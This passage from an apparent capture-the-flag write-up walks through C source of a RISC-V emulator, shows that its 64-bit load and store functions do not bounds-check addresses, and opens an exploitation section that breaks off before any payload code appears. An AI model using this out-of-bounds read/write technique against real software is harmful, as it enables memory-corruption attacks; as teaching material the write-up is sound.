</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> <span style="color:#f60">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Our target is trying to look at an OOB read or write bug. So, I decided to skim for instructions that related to reading/storing value in memory. And then, I noticed this sequence of actions.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">exec_SD</span>(CPU<span style="color:#555">*</span> cpu, <span style="color:#078;font-weight:bold">uint32_t</span> inst) {
</span></span><span style="display:flex;"><span>    <span style="color:#078;font-weight:bold">uint64_t</span> imm <span style="color:#555">=</span> imm_S(inst);
</span></span><span style="display:flex;"><span>    <span style="color:#078;font-weight:bold">uint64_t</span> addr <span style="color:#555">=</span> cpu<span style="color:#555">-&gt;</span>regs[rs1(inst)] <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">int64_t</span>) imm;
</span></span><span style="display:flex;"><span>    cpu_store(cpu, addr, <span style="color:#f60">64</span>, cpu<span style="color:#555">-&gt;</span>regs[rs2(inst)]); <span style="color:#09f;font-style:italic">// &lt;- Let&#39;s expand this
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    print_op(<span style="color:#c30">&#34;sd</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">cpu_store</span>(CPU<span style="color:#555">*</span> cpu, <span style="color:#078;font-weight:bold">uint64_t</span> addr, <span style="color:#078;font-weight:bold">uint64_t</span> size, <span style="color:#078;font-weight:bold">uint64_t</span> value) {
</span></span><span style="display:flex;"><span>    bus_store(<span style="color:#555">&amp;</span>(cpu<span style="color:#555">-&gt;</span>bus), addr, size, value); <span style="color:#09f;font-style:italic">// &lt;- Let&#39;s expand this
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">bus_store</span>(BUS<span style="color:#555">*</span> bus, <span style="color:#078;font-weight:bold">uint64_t</span> addr, <span style="color:#078;font-weight:bold">uint64_t</span> size, <span style="color:#078;font-weight:bold">uint64_t</span> value) {
</span></span><span style="display:flex;"><span>    dram_store(<span style="color:#555">&amp;</span>(bus<span style="color:#555">-&gt;</span>dram), addr, size, value); <span style="color:#09f;font-style:italic">// &lt;- Let&#39;s expand this
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">dram_store</span>(DRAM<span style="color:#555">*</span> dram, <span style="color:#078;font-weight:bold">uint64_t</span> addr, <span style="color:#078;font-weight:bold">uint64_t</span> size, <span style="color:#078;font-weight:bold">uint64_t</span> value) {
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">switch</span> (size) {
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">8</span><span style="color:#555">:</span>  dram_store_8(dram, addr, value);  <span style="color:#069;font-weight:bold">break</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">16</span><span style="color:#555">:</span> dram_store_16(dram, addr, value); <span style="color:#069;font-weight:bold">break</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">32</span><span style="color:#555">:</span> dram_store_32(dram, addr, value); <span style="color:#069;font-weight:bold">break</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">64</span><span style="color:#555">:</span> dram_store_64(dram, addr, value); <span style="color:#069;font-weight:bold">break</span>; <span style="color:#09f;font-style:italic">// &lt;- Let&#39;s expand this
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>        <span style="color:#069;font-weight:bold">default</span><span style="color:#555">:</span> ;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#099">#define DRAM_SIZE 1024*1024*1
</span></span></span><span style="display:flex;"><span><span style="color:#099">#define DRAM_BASE 0x80000000
</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">typedef</span> <span style="color:#069;font-weight:bold">struct</span> DRAM {
</span></span><span style="display:flex;"><span>	<span style="color:#078;font-weight:bold">uint8_t</span> mem[DRAM_SIZE];     <span style="color:#09f;font-style:italic">// Dram memory of DRAM_SIZE
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>} DRAM;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">dram_store_64</span>(DRAM<span style="color:#555">*</span> dram, <span style="color:#078;font-weight:bold">uint64_t</span> addr, <span style="color:#078;font-weight:bold">uint64_t</span> value) {
</span></span><span style="display:flex;"><span>    dram<span style="color:#555">-&gt;</span>mem[addr<span style="color:#555">-</span>DRAM_BASE] <span style="color:#555">=</span> (<span style="color:#078;font-weight:bold">uint8_t</span>) (value <span style="color:#555">&amp;</span> <span style="color:#f60">0xff</span>);
</span></span><span style="display:flex;"><span>    dram<span style="color:#555">-&gt;</span>mem[addr<span style="color:#555">-</span>DRAM_BASE <span style="color:#555">+</span> <span style="color:#f60">1</span>] <span style="color:#555">=</span> (<span style="color:#078;font-weight:bold">uint8_t</span>) ((value <span style="color:#555">&gt;&gt;</span> <span style="color:#f60">8</span>) <span style="color:#555">&amp;</span> <span style="color:#f60">0xff</span>);
</span></span><span style="display:flex;"><span>    dram<span style="color:#555">-&gt;</span>mem[addr<span style="color:#555">-</span>DRAM_BASE <span style="color:#555">+</span> <span style="color:#f60">2</span>] <span style="color:#555">=</span> (<span style="color:#078;font-weight:bold">uint8_t</span>) ((value <span style="color:#555">&gt;&gt;</span> <span style="color:#f60">16</span>) <span style="color:#555">&amp;</span> <span style="color:#f60">0xff</span>);
</span></span><span style="display:flex;"><span>    dram<span style="color:#555">-&gt;</span>mem[addr<span style="color:#555">-</span>DRAM_BASE <span style="color:#555">+</span> <span style="color:#f60">3</span>] <span style="color:#555">=</span> (<span style="color:#078;font-weight:bold">uint8_t</span>) ((value <span style="color:#555">&gt;&gt;</span> <span style="color:#f60">24</span>) <span style="color:#555">&amp;</span> <span style="color:#f60">0xff</span>);
</span></span><span style="display:flex;"><span>    dram<span style="color:#555">-&gt;</span>mem[addr<span style="color:#555">-</span>DRAM_BASE <span style="color:#555">+</span> <span style="color:#f60">4</span>] <span style="color:#555">=</span> (<span style="color:#078;font-weight:bold">uint8_t</span>) ((value <span style="color:#555">&gt;&gt;</span> <span style="color:#f60">32</span>) <span style="color:#555">&amp;</span> <span style="color:#f60">0xff</span>);
</span></span><span style="display:flex;"><span>    dram<span style="color:#555">-&gt;</span>mem[addr<span style="color:#555">-</span>DRAM_BASE <span style="color:#555">+</span> <span style="color:#f60">5</span>] <span style="color:#555">=</span> (<span style="color:#078;font-weight:bold">uint8_t</span>) ((value <span style="color:#555">&gt;&gt;</span> <span style="color:#f60">40</span>) <span style="color:#555">&amp;</span> <span style="color:#f60">0xff</span>);
</span></span><span style="display:flex;"><span>    dram<span style="color:#555">-&gt;</span>mem[addr<span style="color:#555">-</span>DRAM_BASE <span style="color:#555">+</span> <span style="color:#f60">6</span>] <span style="color:#555">=</span> (<span style="color:#078;font-weight:bold">uint8_t</span>) ((value <span style="color:#555">&gt;&gt;</span> <span style="color:#f60">48</span>) <span style="color:#555">&amp;</span> <span style="color:#f60">0xff</span>);
</span></span><span style="display:flex;"><span>    dram<span style="color:#555">-&gt;</span>mem[addr<span style="color:#555">-</span>DRAM_BASE <span style="color:#555">+</span> <span style="color:#f60">7</span>] <span style="color:#555">=</span> (<span style="color:#078;font-weight:bold">uint8_t</span>) ((value <span style="color:#555">&gt;&gt;</span> <span style="color:#f60">56</span>) <span style="color:#555">&amp;</span> <span style="color:#f60">0xff</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Notice that there isn&rsquo;t any check on the <code>addr</code> whether the result of <code>addr-DRAM_BASE</code> is larger than the array <code>mem</code> size or not. This means, if we put the correct <code>addr</code> value, we can simply do OOB read and write. The <code>exec_SD</code> above is used to do OOB write by passing the correct <code>addr</code>, and then I notice another function called <code>exec_LD</code>, which can be used to do OOB read.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">exec_LD</span>(CPU<span style="color:#555">*</span> cpu, <span style="color:#078;font-weight:bold">uint32_t</span> inst) {
</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic">// load 8 byte to rd from address in rs1
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    <span style="color:#078;font-weight:bold">uint64_t</span> imm <span style="color:#555">=</span> imm_I(inst);
</span></span><span style="display:flex;"><span>    <span style="color:#078;font-weight:bold">uint64_t</span> addr <span style="color:#555">=</span> cpu<span style="color:#555">-&gt;</span>regs[rs1(inst)] <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">int64_t</span>) imm;
</span></span><span style="display:flex;"><span>    cpu<span style="color:#555">-&gt;</span>regs[rd(inst)] <span style="color:#555">=</span> (<span style="color:#078;font-weight:bold">int64_t</span>) cpu_load(cpu, addr, <span style="color:#f60">64</span>);
</span></span><span style="display:flex;"><span>    print_op(<span style="color:#c30">&#34;ld</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#078;font-weight:bold">uint64_t</span> <span style="color:#c0f">cpu_load</span>(CPU<span style="color:#555">*</span> cpu, <span style="color:#078;font-weight:bold">uint64_t</span> addr, <span style="color:#078;font-weight:bold">uint64_t</span> size) {
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> bus_load(<span style="color:#555">&amp;</span>(cpu<span style="color:#555">-&gt;</span>bus), addr, size);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#078;font-weight:bold">uint64_t</span> <span style="color:#c0f">bus_load</span>(BUS<span style="color:#555">*</span> bus, <span style="color:#078;font-weight:bold">uint64_t</span> addr, <span style="color:#078;font-weight:bold">uint64_t</span> size) {
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> dram_load(<span style="color:#555">&amp;</span>(bus<span style="color:#555">-&gt;</span>dram), addr, size);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#078;font-weight:bold">uint64_t</span> <span style="color:#c0f">dram_load_64</span>(DRAM<span style="color:#555">*</span> dram, <span style="color:#078;font-weight:bold">uint64_t</span> addr){
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> (<span style="color:#078;font-weight:bold">uint64_t</span>) dram<span style="color:#555">-&gt;</span>mem[addr<span style="color:#555">-</span>DRAM_BASE]
</span></span><span style="display:flex;"><span>        <span style="color:#555">|</span>  (<span style="color:#078;font-weight:bold">uint64_t</span>) dram<span style="color:#555">-&gt;</span>mem[addr<span style="color:#555">-</span>DRAM_BASE <span style="color:#555">+</span> <span style="color:#f60">1</span>] <span style="color:#555">&lt;&lt;</span> <span style="color:#f60">8</span>
</span></span><span style="display:flex;"><span>        <span style="color:#555">|</span>  (<span style="color:#078;font-weight:bold">uint64_t</span>) dram<span style="color:#555">-&gt;</span>mem[addr<span style="color:#555">-</span>DRAM_BASE <span style="color:#555">+</span> <span style="color:#f60">2</span>] <span style="color:#555">&lt;&lt;</span> <span style="color:#f60">16</span>
</span></span><span style="display:flex;"><span>        <span style="color:#555">|</span>  (<span style="color:#078;font-weight:bold">uint64_t</span>) dram<span style="color:#555">-&gt;</span>mem[addr<span style="color:#555">-</span>DRAM_BASE <span style="color:#555">+</span> <span style="color:#f60">3</span>] <span style="color:#555">&lt;&lt;</span> <span style="color:#f60">24</span>
</span></span><span style="display:flex;"><span>        <span style="color:#555">|</span>  (<span style="color:#078;font-weight:bold">uint64_t</span>) dram<span style="color:#555">-&gt;</span>mem[addr<span style="color:#555">-</span>DRAM_BASE <span style="color:#555">+</span> <span style="color:#f60">4</span>] <span style="color:#555">&lt;&lt;</span> <span style="color:#f60">32</span>
</span></span><span style="display:flex;"><span>        <span style="color:#555">|</span>  (<span style="color:#078;font-weight:bold">uint64_t</span>) dram<span style="color:#555">-&gt;</span>mem[addr<span style="color:#555">-</span>DRAM_BASE <span style="color:#555">+</span> <span style="color:#f60">5</span>] <span style="color:#555">&lt;&lt;</span> <span style="color:#f60">40</span> 
</span></span><span style="display:flex;"><span>        <span style="color:#555">|</span>  (<span style="color:#078;font-weight:bold">uint64_t</span>) dram<span style="color:#555">-&gt;</span>mem[addr<span style="color:#555">-</span>DRAM_BASE <span style="color:#555">+</span> <span style="color:#f60">6</span>] <span style="color:#555">&lt;&lt;</span> <span style="color:#f60">48</span>
</span></span><span style="display:flex;"><span>        <span style="color:#555">|</span>  (<span style="color:#078;font-weight:bold">uint64_t</span>) dram<span style="color:#555">-&gt;</span>mem[addr<span style="color:#555">-</span>DRAM_BASE <span style="color:#555">+</span> <span style="color:#f60">7</span>] <span style="color:#555">&lt;&lt;</span> <span style="color:#f60">56</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#078;font-weight:bold">uint64_t</span> <span style="color:#c0f">dram_load</span>(DRAM<span style="color:#555">*</span> dram, <span style="color:#078;font-weight:bold">uint64_t</span> addr, <span style="color:#078;font-weight:bold">uint64_t</span> size) {
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">switch</span> (size) {
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">8</span><span style="color:#555">:</span>  <span style="color:#069;font-weight:bold">return</span> dram_load_8(dram, addr);  <span style="color:#069;font-weight:bold">break</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">16</span><span style="color:#555">:</span> <span style="color:#069;font-weight:bold">return</span> dram_load_16(dram, addr); <span style="color:#069;font-weight:bold">break</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">32</span><span style="color:#555">:</span> <span style="color:#069;font-weight:bold">return</span> dram_load_32(dram, addr); <span style="color:#069;font-weight:bold">break</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">64</span><span style="color:#555">:</span> <span style="color:#069;font-weight:bold">return</span> dram_load_64(dram, addr); <span style="color:#069;font-weight:bold">break</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">default</span><span style="color:#555">:</span> ;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> <span style="color:#f60">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>With those two functions, we have found the OOB bug in the emulator. Now, let&rsquo;s move to the exploitation step.</p>
<h2 id="exploitation">Exploitation <a href="#exploitation" class="anchor">#</a></h2>
<p>Okay, now that we have found our targeted functions during our initial analysis, to help craft the payload easier, I try to build a helper first in python to generate the file that will be passed to the emulator.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
